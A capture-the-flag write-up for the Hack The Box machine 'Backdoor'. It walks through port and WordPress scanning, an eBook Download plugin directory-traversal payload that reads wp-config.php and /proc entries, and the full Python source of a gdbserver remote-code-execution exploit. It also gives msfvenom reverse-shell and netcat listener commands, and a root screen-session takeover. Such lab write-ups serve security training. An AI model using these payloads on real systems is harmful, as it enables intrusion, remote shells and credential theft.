# Backdoor

![Backdoor](<../../../.gitbook/assets/image (2).png>)

## Reconnaissance <a href="#491d" id="491d"></a>

First we want to run a initial rustscan to see what ports are open and what services are on those ports.

```hcl
sudo rustscan -a 10.129.133.133
```

```hcl
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.133.133:22
Open 10.129.133.133:80
Open 10.129.133.133:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 22:49 EDT
Initiating Ping Scan at 22:49
Scanning 10.129.133.133 [4 ports]
Completed Ping Scan at 22:49, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:49
Completed Parallel DNS resolution of 1 host. at 22:49, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 5, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:49
Scanning 10.129.133.133 [3 ports]
Discovered open port 80/tcp on 10.129.133.133
Discovered open port 1337/tcp on 10.129.133.133
Discovered open port 22/tcp on 10.129.133.133
Completed SYN Stealth Scan at 22:49, 0.07s elapsed (3 total ports)
Nmap scan report for 10.129.133.133
Host is up, received echo-reply ttl 63 (0.034s latency).
Scanned at 2022-04-23 22:49:03 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

We get back the following information:

* **Port 22:** running ssh
* **Port 80:** running a web server
* **Port 1337:** running waste (This looks interesting)

## Enumeration

Visiting the site we can see it is running wordpress

![](<../../../.gitbook/assets/image (20).png>)

Also hovering over a link gives us the hostname to put in our hosts file

{% code title="/etc/hosts" %}
```hcl
# HTB
10.129.133.133 backdoor.htb
```
{% endcode %}

Since this is wordpress we can use [wpscan](https://wpscan.com/wordpress-security-scanner) to try and find a vulnerability

```bash
wpscan --url http://backdoor.htb/ -e ap --plugins-detection aggressive
```

* **-e:** Enumeration Process set to All Plugins (ap)
* **--plugins-detection:** picks up either plugins in use (passive) or all plugins (aggressive)

After some time we get this

```hcl
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://backdoor.htb/ [10.129.133.133]
[+] Started: Sat Apr 23 23:24:19 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating All Plugins (via Aggressive Methods)
  Checking Known Locations - Time: 00:02:18 <======                                                                                                       > (6242 / 97846)  6.37%  ETA: 00:33:5  Checking Known Locations - Time: 00:02:22 <======                                                                                                       > (6511 / 97846)  6.65%  ETA: 00:33:1  Checking Known Locations - Time: 00:02:23 <======                                                                                                       > (6644 / 97846)  6.79%  ETA: 00:32:5 Checking Known Locations - Time: 00:21:13 <===========================================================================================================> (97846 / 97846) 100.00% Time: 00:21:13
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Apr 23 23:46:49 2022
[+] Requests Done: 97856
[+] Cached Requests: 39
[+] Data Sent: 26.254 MB
[+] Data Received: 13.088 MB
[+] Memory used: 421.66 MB
[+] Elapsed time: 00:22:29
```

We see an interesting plugin called ebook-download

Searching exploit db we find this poc: [https://www.exploit-db.com/exploits/39575](https://www.exploit-db.com/exploits/39575)

```
# Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7
 
[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================
 
[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
```

Going to that url in the poc we get prompted to download what looks to be the config

![](<../../../.gitbook/assets/image (11).png>)

![](<../../../.gitbook/assets/image (26).png>)

Looks like we have an [LFI](https://en.wikipedia.org/wiki/File\_inclusion\_vulnerability) vulnerability (Local File Inclusion)

With this LFI vulnerability we found we can try to see what processes are running to see what is running on port 1337. Using this command we can get a list of the first 1000 processes running and output it to a processes.txt file so we can search for anything interesting.

```bash
for i in {1..1000}; curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{$i}/cmdline >> processes.txt
```

The output file looks a bit messy

![Forgot to add a newline](<../../../.gitbook/assets/image (25).png>)

However we can fix this. Each line from the processes seems to end in `<script>window.close()</script>`

We can find and replace this with a new line to get each process on its own line

![Cleaned up output](<../../../.gitbook/assets/image (7).png>)

This is much easier to read and we can see a few interesting things. gdbserver seems tto be running on port 1337 and screen seems to be running as root which might be an opportunity for a privilege escalation later.

## Exploitation

Looking up gdbserver in exploitdb we see a possible exploit here: [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539)

```python
# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)

#!/usr/bin/env python3


import binascii
import socket
import struct
import sys

help = f'''
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
'''


def checksum(s: str) -> str:
    res = sum(map(ord, s)) % 256
    return f'{res:2x}'


def ack(sock):
    sock.send(b'+')


def send(sock, s: str) -> str:
    sock.send(f'${s}#{checksum(s)}'.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()


def exploit(sock, payload: str):
    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')
    send(sock, '!')

    try:
        res = send(sock, 'vCont;s')
        data = res.split(';')[2]
        arch, pc = data.split(':')
    except Exception:
        print('[!] ERROR: Unexpected response. Try again later')
        exit(1)

    if arch == '10':
        print('[+] Found x64 arch')
        pc = binascii.unhexlify(pc[:pc.index('0*')])
        pc += b'\0' * (8 - len(pc))
        addr = hex(struct.unpack('<Q', pc)[0])[2:]
        addr = '0' * (16 - len(addr)) + addr
    elif arch == '08':
        print('[+] Found x86 arch')
        pc = binascii.unhexlify(pc)
        pc += b'\0' * (4 - len(pc))
        addr = hex(struct.unpack('<I', pc)[0])[2:]
        addr = '0' * (8 - len(addr)) + addr

    hex_length = hex(len(payload))[2:]

    print('[+] Sending payload')
    send(sock, f'M{addr},{hex_length}:{payload}')
    send(sock, 'vCont;c')


def main():
    if len(sys.argv) < 3:
        print(help)
        exit(1)

    ip, port = sys.argv[1].split(':')
    file = sys.argv[2]

    try:
        with open(file, 'rb') as f:
            payload = f.read().hex()
    except FileNotFoundError:
        print(f'[!] ERROR: File {file} not found')
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, int(port)))
        print('[+] Connected to target. Preparing exploit')
        exploit(sock, payload)
        print('[*] Pwned!! Check your listener')


if __name__ == '__main__':
    main()    
```

&#x20;First thing this script needs us to do is generate a reverse shell with msfvenom

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=9001 PrependFork=true -o rev.bin
```

I had to first update my local host (LHOST) and I changed the port to 9001

![Reverse Shell Created](<../../../.gitbook/assets/image (23).png>)

Next we need to set up a netcat listener to listen out on port 9001

```
nc -lvnp 9001
```

Next we need to run the exploit against the target machine and try and catch the shell

```
python3 50539.py 10.129.133.133:1337 rev.bin
```

![Pwned!!](<../../../.gitbook/assets/image (24).png>)

And we got a reverse shell!

![Shell Captured](<../../../.gitbook/assets/image (15).png>)

Time to upgrade the shell with python

![Upgraded shell](<../../../.gitbook/assets/image (12).png>)

This is where we find the user flag!&#x20;

{% hint style="warning" %}
Note: Flag will be partially hidden in write-up
{% endhint %}

<details>

<summary>user.txt</summary>

dd1418e1e9711a65\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

</details>

## Privilege Escalation

Now we need to escalate to the root user.&#x20;

Earlier we saw that screen was running as the root user so maybe there is a vulnerability we can exploit with screen.

![SUID](<../../../.gitbook/assets/image (10).png>)

It also turns out that we can resume the root user screen session with `screen -r root/`

![I am root!](<../../../.gitbook/assets/image (13).png>)

And now we find root.txt

{% hint style="warning" %}
Note: Flag will be partially hidden in write-up
{% endhint %}

<details>

<summary>root.txt</summary>

82fc95e28d2b2103\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

</details>

We can see the screen process being set up in cron now and how the gdbserver was set up

![](<../../../.gitbook/assets/image (8).png>)

Looks like screen had multiuser enabled and the user `user` was allowed to resume sessions

We can also see that the gdbserver was setup to run here

## Lessons Learned

1. Never configure screen with multiuser support especially as a root user and allow other users to resume your screen session.
2. Make sure you restrict who can access your remote debugger or at the very least make sure it is patched.
3. If at first wpscan does not return enough useful results, try again but with it searching all plugins in aggressive mode.&#x20;
